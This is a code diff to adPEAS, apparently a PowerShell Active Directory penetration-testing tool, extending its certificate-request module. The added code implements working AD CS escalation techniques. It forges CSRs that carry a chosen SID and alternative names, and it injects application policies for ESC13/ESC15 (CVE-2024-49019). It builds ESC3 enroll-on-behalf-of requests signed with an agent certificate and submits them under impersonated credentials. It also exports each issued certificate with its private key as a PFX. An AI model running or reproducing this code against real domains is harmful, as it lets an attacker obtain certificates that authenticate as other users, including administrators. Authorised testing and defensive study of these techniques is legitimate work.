@@ -12,6 +12,10 @@ function New-PKCS10Request {
 
         [string[]]$AlternativeNames,
 
+        [string]$SID,
+
+        [string[]]$ApplicationPolicies,
+
         [ValidateSet(1024, 2048, 4096)]
         [int]$KeyLength = 2048
     )
@@ -19,7 +23,7 @@ function New-PKCS10Request {
     $FunctionPrefix = "[New-PKCS10Request]"
 
     # Generate RSA key pair
-    Write-Log "$FunctionPrefix Generating $KeyLength-bit RSA key pair"
+    Write-Log "$FunctionPrefix Generating $KeyLength-bit RSA key pair (Subject='$SubjectDN', SANs=$($AlternativeNames.Count), SID=$(if ($SID) { 'yes' } else { 'no' }), AppPolicies=$($ApplicationPolicies.Count))"
     $rsa = [System.Security.Cryptography.RSA]::Create($KeyLength)
 
     try {
@@ -44,21 +48,83 @@ function New-PKCS10Request {
         $subjectPKInfo = New-ASN1Sequence -Data ([byte[]]($algorithmId + $pubKeyBitString))
 
         # === 3. Build Attributes [0] ===
+        # Collect all requested X.509 extensions, then wrap them in a single
+        # extensionRequest attribute (RFC 2985). Supported extensions:
+        #   - Subject Alternative Name (2.5.29.17)            via -AlternativeNames
+        #   - NTDS CA Security Extension (1.3.6.1.4.1.311.25.2) via -SID
         $attributesContent = [byte[]]@()
+        $extensionBlobs = [System.Collections.Generic.List[byte]]::new()
+        $extensionCount = 0
 
+        # Assemble the SAN GeneralNames. The SID is embedded BOTH as a SAN URL
+        # (tag:microsoft.com,2022-09-14:sid:<SID>) and as the dedicated NTDS CA
+        # Security Extension below - this mirrors Certipy. CAs that honour requester
+        # SANs (ESC1/ESC6) copy the SAN URL into the issued certificate even when they
+        # ignore the requester-supplied NTDS extension, so the SAN URL is the reliable
+        # carrier for strong mapping.
+        $sanNames = @()
         if ($AlternativeNames -and $AlternativeNames.Count -gt 0) {
-            # Build SAN extension via extensionRequest attribute
-            $sanExtension = New-SANExtension -AlternativeNames $AlternativeNames
-            if ($sanExtension) {
-                # Extensions SEQUENCE
-                $extensionsSeq = New-ASN1Sequence -Data $sanExtension
+            $sanNames += $AlternativeNames
+        }
+        if ($SID) {
+            $sanNames += "URL:tag:microsoft.com,2022-09-14:sid:$SID"
+        }
 
-                # extensionRequest attribute: OID 1.2.840.113549.1.9.14 + SET { Extensions }
-                $extReqOID = New-ASN1ObjectIdentifier -OID "1.2.840.113549.1.9.14"
-                $extReqValues = New-ASN1Set -Data $extensionsSeq
-                $extReqAttr = New-ASN1Sequence -Data ([byte[]]($extReqOID + $extReqValues))
-                $attributesContent = $extReqAttr
+        if ($sanNames.Count -gt 0) {
+            $sanExtension = New-SANExtension -AlternativeNames $sanNames
+            if ($sanExtension) {
+                $extensionBlobs.AddRange([byte[]]$sanExtension)
+                $extensionCount++
+                Write-Log "$FunctionPrefix Added Subject Alternative Name extension ($($sanNames.Count) name(s)): $($sanNames -join ', ')"
             }
+            else {
+                Write-Log "$FunctionPrefix SAN extension requested but produced no GeneralNames - skipping"
+            }
+        }
+
+        if ($SID) {
+            # Dedicated NTDS CA Security Extension for strong mapping on DCs running
+            # StrongCertificateBindingEnforcement (KB5014754, mandatory since Feb 2025).
+            $sidExtension = New-NTDSCASecurityExtension -SID $SID
+            if ($sidExtension) {
+                $extensionBlobs.AddRange([byte[]]$sidExtension)
+                $extensionCount++
+                Write-Log "$FunctionPrefix Added NTDS CA Security (SID) extension: $SID"
+            }
+            else {
+                Write-Log "$FunctionPrefix SID extension requested but could not be built for '$SID' - skipping" -Level Warning
+            }
+        }
+
+        if ($ApplicationPolicies -and $ApplicationPolicies.Count -gt 0) {
+            # ESC13/ESC15: inject Microsoft Application Policies (szOID_APPLICATION_CERT_POLICIES).
+            # On schema-v1 templates (CVE-2024-49019/EKUwu) these are not sanitised, so
+            # arbitrary EKUs (e.g. Client Authentication, Certificate Request Agent) can
+            # be requested even when the template does not list them.
+            $apExtension = New-ApplicationPoliciesExtension -PolicyOIDs $ApplicationPolicies
+            if ($apExtension) {
+                $extensionBlobs.AddRange([byte[]]$apExtension)
+                $extensionCount++
+                Write-Log "$FunctionPrefix Added Application Policies extension ($($ApplicationPolicies.Count) requested)"
+            }
+            else {
+                Write-Log "$FunctionPrefix Application Policies requested but none could be resolved - skipping" -Level Warning
+            }
+        }
+
+        if ($extensionCount -gt 0) {
+            # Extensions ::= SEQUENCE OF Extension
+            $extensionsSeq = New-ASN1Sequence -Data ($extensionBlobs.ToArray())
+
+            # extensionRequest attribute: OID 1.2.840.113549.1.9.14 + SET { Extensions }
+            $extReqOID = New-ASN1ObjectIdentifier -OID "1.2.840.113549.1.9.14"
+            $extReqValues = New-ASN1Set -Data $extensionsSeq
+            $extReqAttr = New-ASN1Sequence -Data ([byte[]]($extReqOID + $extReqValues))
+            $attributesContent = $extReqAttr
+            Write-Log "$FunctionPrefix Built extensionRequest attribute with $extensionCount extension(s)"
+        }
+        else {
+            Write-Log "$FunctionPrefix No extensions requested - CSR has empty attribute set"
         }
 
         # [0] IMPLICIT constructed context tag
@@ -227,8 +293,16 @@ function New-SANExtension {
                 $dnsLen = New-ASN1Length -Length $dnsBytes.Length
                 $generalNames += [byte[]](@($dnsTag) + $dnsLen + $dnsBytes)
             }
+            'URL' {
+                # uniformResourceIdentifier [6] IA5String
+                # Used for the SID-in-SAN form: tag:microsoft.com,2022-09-14:sid:<SID>
+                $urlBytes = [System.Text.Encoding]::ASCII.GetBytes($sanValue)
+                $urlTag = [byte]0x86  # Context [6] IMPLICIT
+                $urlLen = New-ASN1Length -Length $urlBytes.Length
+                $generalNames += [byte[]](@($urlTag) + $urlLen + $urlBytes)
+            }
             default {
-                Write-Warning "[New-SANExtension] Unsupported SAN type '$sanType'. Supported: UPN, DNS."
+                Write-Warning "[New-SANExtension] Unsupported SAN type '$sanType'. Supported: UPN, DNS, URL."
             }
         }
     }
@@ -245,6 +319,233 @@ function New-SANExtension {
     $sanOctet = New-ASN1OctetString -Value $generalNamesSeq
 
     return [byte[]](New-ASN1Sequence -Data ([byte[]]($sanOID + $sanOctet)))
+}
+
+<#
+.SYNOPSIS
+    Builds the NTDS CA Security Extension (szOID_NTDS_CA_SECURITY_EXT) carrying an
+    object SID for strong certificate mapping.
+.DESCRIPTION
+    Encodes the requested principal's SID into the certificate so that domain
+    controllers enforcing StrongCertificateBindingEnforcement (KB5014754) map the
+    certificate to that principal. The structure mirrors what the CA itself emits:
+
+        Extension ::= SEQUENCE {
+            extnID    OBJECT IDENTIFIER (1.3.6.1.4.1.311.25.2),
+            extnValue OCTET STRING wrapping
+                SEQUENCE OF GeneralName {
+                    [0] otherName {
+                        type-id OBJECT IDENTIFIER (1.3.6.1.4.1.311.25.2.1),
+                        value   [0] EXPLICIT OCTET STRING (SID string, ASCII)
+                    }
+                }
+        }
+
+    The SID is carried in its string form (e.g. "S-1-5-21-...-500") as required by
+    szOID_NTDS_OBJECTSID.
+#>
+function New-NTDSCASecurityExtension {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [string]$SID
+    )
+
+    $FunctionPrefix = "[New-NTDSCASecurityExtension]"
+
+    if ($SID -notmatch '^S-1-\d+(-\d+)+$') {
+        Write-Warning "$FunctionPrefix '$SID' is not a valid SID string (expected S-1-5-21-...). Skipping SID extension."
+        return $null
+    }
+
+    # otherName value: [0] EXPLICIT OCTET STRING (SID string as ASCII)
+    $sidBytes = [System.Text.Encoding]::ASCII.GetBytes($SID)
+    $sidOctet = New-ASN1OctetString -Value $sidBytes
+    $ctx0Value = [byte[]](@(0xA0) + (New-ASN1Length -Length $sidOctet.Length) + $sidOctet)
+
+    # otherName content: type-id OID (szOID_NTDS_OBJECTSID) + [0] value
+    $objectSidOID = New-ASN1ObjectIdentifier -OID "1.3.6.1.4.1.311.25.2.1"
+    $otherNameContent = [byte[]]($objectSidOID + $ctx0Value)
+
+    # GeneralName [0] IMPLICIT (otherName)
+    $otherName = [byte[]](@(0xA0) + (New-ASN1Length -Length $otherNameContent.Length) + $otherNameContent)
+
+    # GeneralNames ::= SEQUENCE OF GeneralName
+    $generalNamesSeq = New-ASN1Sequence -Data $otherName
+
+    # Extension ::= SEQUENCE { extnID, extnValue OCTET STRING }
+    $extOID = New-ASN1ObjectIdentifier -OID "1.3.6.1.4.1.311.25.2"
+    $extnValue = New-ASN1OctetString -Value $generalNamesSeq
+
+    Write-Log "$FunctionPrefix Encoded NTDS CA Security Extension for SID $SID"
+    return [byte[]](New-ASN1Sequence -Data ([byte[]]($extOID + $extnValue)))
+}
+
+<#
+.SYNOPSIS
+    Builds the Microsoft Application Policies extension (szOID_APPLICATION_CERT_POLICIES,
+    1.3.6.1.4.1.311.21.10) for ESC13/ESC15 (EKUwu / CVE-2024-49019).
+.DESCRIPTION
+    Encodes a CertificatePolicies value (SEQUENCE OF PolicyInformation, each just a
+    policyIdentifier OID, no qualifiers) - the same shape as RFC 5280 certificatePolicies.
+    Accepts raw OIDs or a set of friendly names (Client Authentication, Certificate
+    Request Agent, Smart Card Logon, ...). Non-critical, matching Certipy.
+.OUTPUTS
+    DER bytes of the Extension SEQUENCE, or $null if no policy could be resolved.
+#>
+function New-ApplicationPoliciesExtension {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [string[]]$PolicyOIDs
+    )
+
+    $FunctionPrefix = "[New-ApplicationPoliciesExtension]"
+
+    # Friendly name -> OID (lowercased keys). Raw OIDs are passed through unchanged.
+    $nameToOid = @{
+        'client authentication'         = '1.3.6.1.5.5.7.3.2'
+        'server authentication'         = '1.3.6.1.5.5.7.3.1'
+        'smart card logon'              = '1.3.6.1.4.1.311.20.2.2'
+        'smartcardlogon'                = '1.3.6.1.4.1.311.20.2.2'
+        'certificate request agent'     = '1.3.6.1.4.1.311.20.2.1'
+        'enrollment agent'              = '1.3.6.1.4.1.311.20.2.1'
+        'code signing'                  = '1.3.6.1.5.5.7.3.3'
+        'any purpose'                   = '2.5.29.37.0'
+        'pkinit client authentication'  = '1.3.6.1.5.2.3.4'
+        'secure email'                  = '1.3.6.1.5.5.7.3.4'
+        'email protection'              = '1.3.6.1.5.5.7.3.4'
+    }
+
+    $policyInfos = [System.Collections.Generic.List[byte]]::new()
+    $resolvedCount = 0
+
+    foreach ($p in $PolicyOIDs) {
+        $val = $p.Trim()
+        $oid = $null
+        if ($val -match '^\d+(\.\d+)+$') {
+            $oid = $val
+        }
+        elseif ($nameToOid.ContainsKey($val.ToLower())) {
+            $oid = $nameToOid[$val.ToLower()]
+        }
+        else {
+            Write-Warning "$FunctionPrefix Unknown application policy '$p' (not an OID and not a known friendly name). Skipping."
+            continue
+        }
+
+        # PolicyInformation ::= SEQUENCE { policyIdentifier OID }
+        $policyInfo = New-ASN1Sequence -Data (New-ASN1ObjectIdentifier -OID $oid)
+        $policyInfos.AddRange([byte[]]$policyInfo)
+        $resolvedCount++
+        Write-Log "$FunctionPrefix Application policy: '$p' -> $oid"
+    }
+
+    if ($resolvedCount -eq 0) {
+        return $null
+    }
+
+    # CertificatePolicies ::= SEQUENCE OF PolicyInformation
+    $certPolicies = New-ASN1Sequence -Data ($policyInfos.ToArray())
+
+    # Extension ::= SEQUENCE { extnID, extnValue OCTET STRING }
+    $extOID = New-ASN1ObjectIdentifier -OID "1.3.6.1.4.1.311.21.10"
+    $extnValue = New-ASN1OctetString -Value $certPolicies
+
+    return [byte[]](New-ASN1Sequence -Data ([byte[]]($extOID + $extnValue)))
+}
+
+<#
+.SYNOPSIS
+    Encodes a string as an ASN.1 BMPString (UTF-16BE). The caller is responsible for
+    any trailing null character (Windows EnrollmentNameValuePair values are null-terminated).
+#>
+function New-ASN1BMPString {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [AllowEmptyString()]
+        [string]$Value
+    )
+    $bytes = [System.Text.Encoding]::BigEndianUnicode.GetBytes($Value)
+    return [byte[]](@(0x1E) + (New-ASN1Length -Length $bytes.Length) + $bytes)
+}
+
+<#
+.SYNOPSIS
+    Builds an "enroll on behalf of" (ESC3) request: a PKCS#7 SignedData envelope around
+    the target's inner PKCS#10 CSR, signed by an enrollment-agent certificate.
+.DESCRIPTION
+    Mirrors the structure Certipy/certreq produce for enrollment-agent requests:
+      ContentInfo (signed_data)
+        SignedData
+          encapContentInfo.contentType = data (1.2.840.113549.1.7.1), content = inner CSR DER
+          certificates = [ agent certificate ]
+          SignerInfo (signed by the agent key) with signed attributes:
+            - 1.3.6.1.4.1.311.21.10 (szOID_APPLICATION_CERT_POLICIES) = Client Auth EKU OID
+            - 1.3.6.1.4.1.311.13.2.1 (szOID_ENROLLMENT_NAME_VALUE_PAIR)
+                = EnrollmentNameValuePair { "requestername", "DOMAIN\user" } (BMPString)
+            - message-digest / content-type (added automatically by SignedCms)
+    The agent certificate must carry the Certificate Request Agent EKU
+    (1.3.6.1.4.1.311.20.2.1) for the CA to honour the request.
+.OUTPUTS
+    Base64 string of the PKCS#7 DER, or $null on failure.
+#>
+function New-EnrollOnBehalfOfRequest {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [byte[]]$InnerCsrDer,
+
+        [Parameter(Mandatory)]
+        [string]$OnBehalfOf,
+
+        [Parameter(Mandatory)]
+        [System.Security.Cryptography.X509Certificates.X509Certificate2]$AgentCert
+    )
+
+    $FunctionPrefix = "[New-EnrollOnBehalfOfRequest]"
+
+    if (-not $AgentCert.HasPrivateKey) {
+        Write-Warning "$FunctionPrefix Agent certificate has no associated private key - cannot sign the request."
+        return $null
+    }
+
+    try { Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue } catch { }
+
+    # EnrollmentNameValuePair { name BMPString, value BMPString }, null-terminated
+    # (UTF-16BE) to match Windows/Certipy on-the-wire encoding.
+    $nameBmp = New-ASN1BMPString -Value ("requestername" + [char]0)
+    $valBmp  = New-ASN1BMPString -Value ($OnBehalfOf + [char]0)
+    $envpDer = New-ASN1Sequence -Data ([byte[]]($nameBmp + $valBmp))
+
+    # Application cert policies attribute value: the Client Authentication EKU OID
+    $clientAuthOidDer = New-ASN1ObjectIdentifier -OID "1.3.6.1.5.5.7.3.2"
+
+    try {
+        $contentInfo = New-Object System.Security.Cryptography.Pkcs.ContentInfo -ArgumentList (,[byte[]]$InnerCsrDer)
+        $cms = New-Object System.Security.Cryptography.Pkcs.SignedCms -ArgumentList $contentInfo, $false
+        $signer = New-Object System.Security.Cryptography.Pkcs.CmsSigner -ArgumentList $AgentCert
+        $signer.DigestAlgorithm = New-Object System.Security.Cryptography.Oid -ArgumentList "2.16.840.1.101.3.4.2.1"  # SHA256
+        $signer.IncludeOption = [System.Security.Cryptography.X509Certificates.X509IncludeOption]::EndCertOnly
+
+        # Note: CryptographicAttributeObjectCollection.Add returns an int index;
+        # suppress it with [void] so it does not leak into the function's output.
+        $appPolOid = New-Object System.Security.Cryptography.Oid -ArgumentList "1.3.6.1.4.1.311.21.10"
+        [void]$signer.SignedAttributes.Add((New-Object System.Security.Cryptography.AsnEncodedData -ArgumentList $appPolOid, ([byte[]]$clientAuthOidDer)))
+
+        $envpOid = New-Object System.Security.Cryptography.Oid -ArgumentList "1.3.6.1.4.1.311.13.2.1"
+        [void]$signer.SignedAttributes.Add((New-Object System.Security.Cryptography.AsnEncodedData -ArgumentList $envpOid, ([byte[]]$envpDer)))
+
+        $cms.ComputeSignature($signer)
+        $p7 = $cms.Encode()
+        Write-Log "$FunctionPrefix Built enroll-on-behalf-of PKCS#7 ($($p7.Length) bytes) for '$OnBehalfOf' signed by '$($AgentCert.Subject)'"
+        return [Convert]::ToBase64String($p7)
+    }
+    catch {
+        Write-Warning "$FunctionPrefix Failed to build/sign on-behalf-of request: $_"
+        return $null
+    }
 }
 
 #endregion
@@ -283,6 +584,7 @@ namespace adPEAS
     {
         public const int CR_IN_BASE64 = 0x1;
         public const int CR_IN_PKCS10 = 0x100;
+        public const int CR_IN_PKCS7 = 0x300;
         public const int CR_OUT_BASE64 = 0x1;
         public const int CR_OUT_CHAIN = 0x100;
     }
@@ -334,7 +636,8 @@ namespace adPEAS
             string caServer,
             string caName,
             string csrBase64,
-            string templateName)
+            string templateName,
+            int inputFlags)
         {
             var result = new CertRequestResult
             {
@@ -349,11 +652,17 @@ namespace adPEAS
 
             try
             {
-                // Create COM object (local or remote)
-                Type certRequestType = Type.GetTypeFromProgID("CertificateAuthority.Request", caServer, false);
+                // Create the ICertRequest COM object LOCALLY. The request is routed
+                // to the (possibly remote) CA by the strConfig "CAHost\CAName" string,
+                // which the certificate client resolves to the CA's ICertRequestD(2)
+                // DCOM interface. Activating the client object remotely (passing the CA
+                // host as the COM server) is wrong and normally fails with access denied.
+                // Any alternate credentials are applied by the caller via thread
+                // impersonation (LogonUser/ImpersonateLoggedOnUser) before this call.
+                Type certRequestType = Type.GetTypeFromProgID("CertificateAuthority.Request");
                 if (certRequestType == null)
                 {
-                    result.ErrorMessage = "Failed to get COM type CertificateAuthority.Request";
+                    result.ErrorMessage = "Failed to get COM type CertificateAuthority.Request (certificate enrollment COM API not available on this host)";
                     return result;
                 }
 
@@ -366,8 +675,10 @@ namespace adPEAS
                 // Build certificate attributes
                 string attributes = string.Format("CertificateTemplate:{0}", templateName);
 
-                // Submit request
-                int flags = CR_FLAGS.CR_IN_BASE64 | CR_FLAGS.CR_IN_PKCS10;
+                // Submit request. inputFlags lets the caller choose the request
+                // format (PKCS#10 for a normal CSR, PKCS#7 for an enroll-on-behalf-of
+                // SignedData envelope). Fall back to Base64 PKCS#10 when unset.
+                int flags = inputFlags != 0 ? inputFlags : (CR_FLAGS.CR_IN_BASE64 | CR_FLAGS.CR_IN_PKCS10);
                 int disposition = certRequest.Submit(flags, csrBase64, attributes, caConfig);
 
                 result.Disposition = disposition;
@@ -379,9 +690,12 @@ namespace adPEAS
 
                 if (disposition == (int)CR_DISPOSITION.CR_DISP_ISSUED)
                 {
-                    // Certificate was issued - retrieve it
+                    // Certificate was issued - retrieve the leaf certificate as Base64.
+                    // CR_OUT_CHAIN is intentionally NOT set: we only need the issued
+                    // certificate to pair with our private key, and a single cert is
+                    // simpler to decode than a Base64 PKCS#7 chain.
                     string certificate;
-                    int outFlags = CR_FLAGS.CR_OUT_BASE64 | CR_FLAGS.CR_OUT_CHAIN;
+                    int outFlags = CR_FLAGS.CR_OUT_BASE64;
                     certRequest.GetCertificate(outFlags, out certificate);
 
                     result.Success = true;
@@ -450,10 +764,95 @@ if (-not ([System.Management.Automation.PSTypeName]'adPEAS.CertificateRequest').
 
 <#
 .SYNOPSIS
+    Decodes a Base64 blob into an X509Certificate2, transparently handling both a
+    single DER certificate and a PKCS#7 / degenerate certs-only chain.
+.DESCRIPTION
+    The certsrv web endpoint returns a single PEM/DER certificate, while the
+    ICertRequest COM interface and some CAs return a Base64 PKCS#7 chain. This
+    helper normalises both into the leaf (end-entity) X509Certificate2 so the
+    private key can be attached uniformly downstream.
+#>
+function ConvertTo-X509FromBase64 {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [string]$Base64
+    )
+
+    $FunctionPrefix = "[ConvertTo-X509FromBase64]"
+
+    # Strip PEM headers/whitespace if present
+    $clean = $Base64
+    if ($clean -match '(?s)-----BEGIN[^-]+-----\s*(.+?)\s*-----END[^-]+-----') {
+        $clean = $Matches[1]
+    }
+    $clean = $clean -replace '\s', ''
+
+    if ([string]::IsNullOrEmpty($clean)) {
+        Write-Log "$FunctionPrefix Empty Base64 input" -Level Warning
+        return $null
+    }
+
+    try {
+        $bytes = [Convert]::FromBase64String($clean)
+    }
+    catch {
+        Write-Log "$FunctionPrefix Input is not valid Base64: $_" -Level Warning
+        return $null
+    }
+
+    # First attempt: single X.509 certificate
+    try {
+        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$bytes)
+        Write-Log "$FunctionPrefix Decoded single X.509 certificate (Subject=$($cert.Subject))"
+        return $cert
+    }
+    catch {
+        Write-Log "$FunctionPrefix Not a single DER certificate, trying PKCS#7 chain: $_"
+    }
+
+    # Second attempt: PKCS#7 / degenerate SignedCms chain - extract the leaf
+    try {
+        $cms = New-Object System.Security.Cryptography.Pkcs.SignedCms
+        $cms.Decode($bytes)
+        $coll = $cms.Certificates
+        if (-not $coll -or $coll.Count -eq 0) {
+            Write-Log "$FunctionPrefix PKCS#7 contained no certificates" -Level Warning
+            return $null
+        }
+
+        # The leaf is the certificate that is not the issuer of any other cert
+        $leaf = $null
+        foreach ($candidate in $coll) {
+            $isIssuerOfAnother = $false
+            foreach ($other in $coll) {
+                if ($other.Subject -ne $candidate.Subject -and $other.Issuer -eq $candidate.Subject) {
+                    $isIssuerOfAnother = $true
+                    break
+                }
+            }
+            if (-not $isIssuerOfAnother) { $leaf = $candidate; break }
+        }
+        if (-not $leaf) { $leaf = $coll[0] }
+
+        Write-Log "$FunctionPrefix Extracted leaf certificate from PKCS#7 chain of $($coll.Count) (Subject=$($leaf.Subject))"
+        return $leaf
+    }
+    catch {
+        Write-Log "$FunctionPrefix Failed to decode as PKCS#7: $_" -Level Warning
+        return $null
+    }
+}
+
+<#
+.SYNOPSIS
     Submits a PKCS#10 CSR via ICertRequest COM/RPC interface.
 .DESCRIPTION
-    Fallback method when Web Enrollment (/certsrv/) is unavailable.
-    Uses DCOM to communicate with the Certificate Authority.
+    Used when Web Enrollment (/certsrv/) is unavailable or when -Method COM is
+    forced. Instantiates the ICertRequest client locally and routes the request to
+    the CA via the "CAHost\CAName" config string (the CA's ICertRequestD2 DCOM
+    interface). When -Credential is supplied, the call runs under a netonly
+    impersonation token so alternate credentials reach the CA.
 #>
 function Submit-COMRequest {
     [CmdletBinding()]
@@ -468,20 +867,31 @@ function Submit-COMRequest {
         [string]$CSRBase64,
 
         [Parameter(Mandatory)]
-        [string]$TemplateName
+        [string]$TemplateName,
+
+        [PSCredential]$Credential,
+
+        # The request payload is a PKCS#7 SignedData envelope (enroll-on-behalf-of)
+        # rather than a bare PKCS#10 CSR.
+        [switch]$IsPKCS7
     )
 
     $FunctionPrefix = "[Submit-COMRequest]"
 
-    Write-Log "$FunctionPrefix Submitting CSR via COM/RPC to $CAServer\$CAName"
+    # CR_IN_BASE64 (0x1) | CR_IN_PKCS10 (0x100) | CR_IN_PKCS7 (0x300)
+    $inputFlags = if ($IsPKCS7) { 0x301 } else { 0x101 }
+
+    Write-Log "$FunctionPrefix Submitting via COM/RPC to config '$CAServer\$CAName' (template '$TemplateName', format=$(if ($IsPKCS7) { 'PKCS#7' } else { 'PKCS#10' }), auth=$(if ($Credential) { 'impersonated credential' } else { 'current context' }))"
 
     $result = @{
         Success      = $false
         RequestID    = $null
         Disposition  = $null
-        Certificate  = $null
+        Certificate  = $null   # X509Certificate2 on success (decoded from Base64)
         ErrorMessage = $null
     }
+
+    $impersonationToken = [IntPtr]::Zero
 
     try {
         # Check if COM type is loaded
@@ -491,30 +901,67 @@ function Submit-COMRequest {
             return $result
         }
 
+        # Apply alternate credentials via thread impersonation so the DCOM call to
+        # the CA authenticates as the supplied user (netonly, NTLM).
+        if ($Credential) {
+            try {
+                Write-Log "$FunctionPrefix Impersonating supplied credential for DCOM call"
+                $impersonationToken = Invoke-NTLMImpersonation -Credential $Credential -Quiet
+            }
+            catch {
+                $result.ErrorMessage = "Failed to impersonate credential for COM/RPC: $($_.Exception.Message)"
+                Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Error
+                return $result
+            }
+        }
+
         # Call C# COM wrapper
         $comResult = [adPEAS.CertificateRequest]::SubmitRequest(
             $CAServer,
             $CAName,
             $CSRBase64,
-            $TemplateName
+            $TemplateName,
+            $inputFlags
         )
 
-        $result.Success = $comResult.Success
         $result.RequestID = $comResult.RequestID
         $result.Disposition = $comResult.Disposition
-        $result.Certificate = $comResult.CertificateBase64
-        $result.ErrorMessage = $comResult.ErrorMessage
+        Write-Log "$FunctionPrefix CA returned disposition=$($comResult.Disposition), RequestID=$($comResult.RequestID)"
 
         if ($comResult.Success) {
-            Write-Log "$FunctionPrefix Certificate issued successfully (RequestID: $($comResult.RequestID))"
+            # Decode the Base64 certificate into an X509Certificate2 for a uniform
+            # downstream contract with the HTTP path (Bug fix: previously the raw
+            # Base64 string leaked into CopyWithPrivateKey/.Thumbprint).
+            $decoded = ConvertTo-X509FromBase64 -Base64 $comResult.CertificateBase64
+            if ($decoded) {
+                $result.Success = $true
+                $result.Certificate = $decoded
+                Write-Log "$FunctionPrefix Certificate issued and decoded (RequestID: $($comResult.RequestID), Thumbprint: $($decoded.Thumbprint))"
+            }
+            else {
+                $result.ErrorMessage = "CA issued the certificate but the returned data could not be decoded"
+                Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Warning
+            }
         }
         else {
+            $result.ErrorMessage = $comResult.ErrorMessage
             Write-Log "$FunctionPrefix Request failed: $($comResult.ErrorMessage)" -Level Warning
         }
     }
     catch {
         $result.ErrorMessage = "COM invocation failed: $($_.Exception.Message)"
         Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Error
+    }
+    finally {
+        if ($impersonationToken -ne [IntPtr]::Zero) {
+            try {
+                Invoke-RevertToSelf -TokenHandle $impersonationToken
+                Write-Log "$FunctionPrefix Reverted impersonation token"
+            }
+            catch {
+                Write-Log "$FunctionPrefix Failed to revert impersonation: $_" -Level Warning
+            }
+        }
     }
 
     return $result
@@ -544,12 +991,15 @@ function Submit-CertsrvRequest {
 
         [switch]$UseHTTP,
 
+        [int]$Port = 0,
+
         [int]$TimeoutSeconds = 30
     )
 
     $FunctionPrefix = "[Submit-CertsrvRequest]"
     $protocol = if ($UseHTTP) { "http" } else { "https" }
-    $submitUrl = "${protocol}://${CAServer}/certsrv/certfnsh.asp"
+    $portPart = if ($Port -gt 0) { ":$Port" } else { "" }
+    $submitUrl = "${protocol}://${CAServer}${portPart}/certsrv/certfnsh.asp"
 
     Write-Log "$FunctionPrefix Submitting CSR to $submitUrl"
 
@@ -752,12 +1202,15 @@ function Get-CertsrvCertificate {
 
         [switch]$UseHTTP,
 
+        [int]$Port = 0,
+
         [int]$TimeoutSeconds = 30
     )
 
     $FunctionPrefix = "[Get-CertsrvCertificate]"
     $protocol = if ($UseHTTP) { "http" } else { "https" }
-    $retrieveUrl = "${protocol}://${CAServer}/certsrv/certnew.cer?ReqID=${RequestID}&Enc=b64"
+    $portPart = if ($Port -gt 0) { ":$Port" } else { "" }
+    $retrieveUrl = "${protocol}://${CAServer}${portPart}/certsrv/certnew.cer?ReqID=${RequestID}&Enc=b64"
 
     Write-Log "$FunctionPrefix Retrieving certificate from $retrieveUrl"
 
@@ -821,39 +1274,322 @@ function Get-CertsrvCertificate {
             return $null
         }
 
-        # Extract Base64 certificate data
-        $certBase64 = $null
-        if ($responseContent -match '(?s)-----BEGIN CERTIFICATE-----\s*(.+?)\s*-----END CERTIFICATE-----') {
-            $certBase64 = $Matches[1] -replace '\s', ''
-        }
-        else {
-            # Response might be raw Base64 without PEM headers
-            $cleaned = $responseContent.Trim() -replace '\s', ''
-            if ($cleaned -match '^[A-Za-z0-9+/=]+$' -and $cleaned.Length -gt 100) {
-                $certBase64 = $cleaned
-            }
-        }
-
-        if (-not $certBase64) {
-            Write-Error "$FunctionPrefix Could not extract certificate data from response"
+        # Decode the response (PEM, raw Base64, or PKCS#7) into the leaf certificate
+        $cert = ConvertTo-X509FromBase64 -Base64 $responseContent
+        if (-not $cert) {
+            Write-Error "$FunctionPrefix Could not extract a certificate from the CA response"
             return $null
         }
-
-        # Decode to X509Certificate2
-        try {
-            $certBytes = [Convert]::FromBase64String($certBase64)
-            $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$certBytes)
-            Write-Log "$FunctionPrefix Certificate retrieved: Subject=$($cert.Subject), Thumbprint=$($cert.Thumbprint)"
-            return $cert
-        }
-        catch {
-            Write-Error "$FunctionPrefix Failed to parse certificate: $_"
-            return $null
-        }
+        Write-Log "$FunctionPrefix Certificate retrieved: Subject=$($cert.Subject), Thumbprint=$($cert.Thumbprint)"
+        return $cert
     }
     finally {
         [System.Net.ServicePointManager]::SecurityProtocol = $originalSecurityProtocol
         [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $originalCertCallback
+    }
+}
+
+#endregion
+
+#region ===== PFX BUILD / PENDING KEY / RETRIEVE =====
+
+<#
+.SYNOPSIS
+    Combines an issued certificate with its private key, writes the PFX, prints a
+    summary, and returns a result object. Shared by the request and retrieve paths.
+#>
+function Save-IssuedCertificatePFX {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [System.Security.Cryptography.X509Certificates.X509Certificate2]$IssuedCert,
+
+        [Parameter(Mandatory)]
+        [System.Security.Cryptography.RSA]$RSA,
+
+        [string]$OutputPath,
+        [switch]$NoPassword,
+        [string]$TemplateName,
+        $RequestID,
+        [string]$CAServer,
+        [switch]$Force
+    )
+
+    $FunctionPrefix = "[Save-IssuedCertificatePFX]"
+
+    # Determine PFX password
+    if ($NoPassword) {
+        $pfxPassword = $null
+        Write-Log "$FunctionPrefix Exporting PFX without password (-NoPassword)"
+    }
+    else {
+        $pfxPassword = New-SafePassword -Length 20
+        Write-Log "$FunctionPrefix Generated random PFX password"
+    }
+
+    # Combine CA-issued cert with our private key
+    try {
+        $certWithKey = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::CopyWithPrivateKey($IssuedCert, $RSA)
+        if ($pfxPassword) {
+            $securePfxPassword = ConvertTo-SecureString -String $pfxPassword -AsPlainText -Force
+            $pfxBytes = $certWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $securePfxPassword)
+        }
+        else {
+            $pfxBytes = $certWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx)
+        }
+        $certWithKey.Dispose()
